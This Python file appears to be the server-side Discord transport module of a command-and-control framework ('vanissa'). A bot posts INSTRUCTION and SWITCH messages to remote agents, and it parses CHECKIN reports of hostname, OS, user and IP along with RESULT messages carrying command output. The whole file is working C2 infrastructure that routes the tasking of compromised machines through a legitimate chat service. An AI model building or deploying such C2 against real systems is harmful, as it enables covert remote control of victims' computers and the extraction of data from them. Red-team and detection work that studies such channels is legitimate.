"""
Discord C2 Channel — server-side discord.py bot.
Sends INSTRUCTION/SWITCH messages and listens for RESULT/CHECKIN/SWITCHACK.
"""

import asyncio
import threading
import time
import logging

import discord
from core.channel import C2Channel
from core.agent import AgentRegistry

log = logging.getLogger("vanissa.discord")


class DiscordChannel(C2Channel):
    """
    Discord channel using a discord.py bot client.
    Runs its own asyncio event loop in a dedicated daemon thread.
    """

    def __init__(self, token: str, registry: AgentRegistry):
        self._token      = token
        self._registry   = registry

        self._loop: asyncio.AbstractEventLoop = None
        self._client: discord.Client = None
        self._thread: threading.Thread = None
        self._target_channel: discord.TextChannel = None
        self._connected = False

    # ─── C2Channel interface ───────────────────────────

    @property
    def name(self) -> str:
        return "discord"

    def connect(self):
        self._loop = asyncio.new_event_loop()

        intents = discord.Intents.default()
        intents.message_content = True
        intents.messages = True

        self._client = discord.Client(intents=intents, loop=self._loop)
        self._setup_handlers()

        self._thread = threading.Thread(
            target=self._run_loop, daemon=True, name="discord-loop"
        )
        self._thread.start()

        deadline = time.time() + 20
        while not self._connected and time.time() < deadline:
            time.sleep(0.3)

        if not self._connected:
            raise ConnectionError("Discord bot failed to connect within 20s")

        log.info("[discord] Connected and listening")

    def send_instruction(self, agent_id: str, instruction_id: str, command: str):
        """Send INSTRUCTION|agent_id|instr_id|command."""
        if not self._target_channel:
            raise RuntimeError("Discord channel not resolved — is the bot connected?")

        msg = f"INSTRUCTION|{agent_id}|{instruction_id}|{command}"
        future = asyncio.run_coroutine_threadsafe(
            self._target_channel.send(msg),
            self._loop
        )
        future.result(timeout=10)

    def send_switch(self, agent_id: str, target_channel: str):
        """Send SWITCH|agent_id|channel_name."""
        if not self._target_channel:
            raise RuntimeError("Discord channel not resolved — is the bot connected?")

        msg = f"SWITCH|{agent_id}|{target_channel}"
        future = asyncio.run_coroutine_threadsafe(
            self._target_channel.send(msg),
            self._loop
        )
        future.result(timeout=10)

    def disconnect(self):
        if self._client and self._connected:
            asyncio.run_coroutine_threadsafe(
                self._client.close(), self._loop
            )
            self._connected = False
            log.info("[discord] Disconnected")

    # ─── Internal ──────────────────────────────────────

    def _run_loop(self):
        asyncio.set_event_loop(self._loop)
        try:
            self._loop.run_until_complete(self._client.start(self._token))
        except Exception as e:
            log.error(f"[discord] Fatal error in discord loop: {e}")

    def _setup_handlers(self):

        @self._client.event
        async def on_ready():
            log.info(f"[discord] Logged in as {self._client.user}")

            for g in self._client.guilds:
                if g.text_channels:
                    self._target_channel = g.text_channels[0]
                    log.info(f"[discord] Bound to #{self._target_channel.name}")
                    self._connected = True
                    return

            log.error("[discord] No text channels found!")

        @self._client.event
        async def on_message(message: discord.Message):
            if message.author == self._client.user:
                return

            self._target_channel = message.channel

            text = message.content or ""
            if not text:
                return

            # ── RESULT|<agent_id>|<instr_id>|<output> ──
            if text.startswith("RESULT|"):
                parts = text.split("|", 3)
                if len(parts) == 4:
                    _, agent_id, instr_id, output = parts
                    self._registry.update_last_seen(agent_id, self.name)
                    self._on_result(agent_id, instr_id, output)

            # ── CHECKIN|<agent_id>|<hostname>|<os>|<user>|<ip> ──
            elif text.startswith("CHECKIN|"):
                parts = text.split("|", 5)
                if len(parts) == 6:
                    _, aid, hostname, os_name, user, ip = parts
                    self._registry.register(
                        aid, hostname, os_name, user, ip, self.name
                    )
                    self._on_checkin(aid, hostname, os_name, user, ip)
                    log.info(f"[discord] Agent checked in: {aid} ({hostname} / {ip})")

            # ── SWITCHACK|<agent_id>|<channel_name> ──
            elif text.startswith("SWITCHACK|"):
                parts = text.split("|", 2)
                if len(parts) == 3:
                    _, aid, ch_name = parts
                    self._registry.update_channel(aid, ch_name)
                    self._on_switchack(aid, ch_name)
                    log.info(f"[discord] Agent {aid} switched to {ch_name}")
